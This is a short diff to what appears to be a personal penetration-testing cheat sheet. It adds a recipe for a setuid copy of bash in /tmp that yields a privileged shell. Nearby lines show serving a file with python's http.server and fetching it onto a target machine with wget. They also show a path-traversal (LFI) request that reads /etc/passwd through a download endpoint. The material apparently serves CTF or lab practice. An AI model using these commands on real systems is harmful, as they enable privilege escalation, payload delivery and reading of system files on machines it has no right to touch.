@@ -19,6 +19,12 @@ reset
    --> python3 -m http.server 8888 (in the directory of yhe file you want to send)
    --> wget http://<myIP>:<port>/filename   (at target's pc)
 
+
+4. cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
+   cd /tmp
+   ./bash -p
+   whoami
+
 --------------------LFI---------------------
 1. (throught pdf export/download) (known exploitable files: https://github.com/hussein98d/LFI-files/blob/master/list.txt):
    --> (burpsuite) GET /download?filename=../../../../../etc/passwd HTTP/1.1
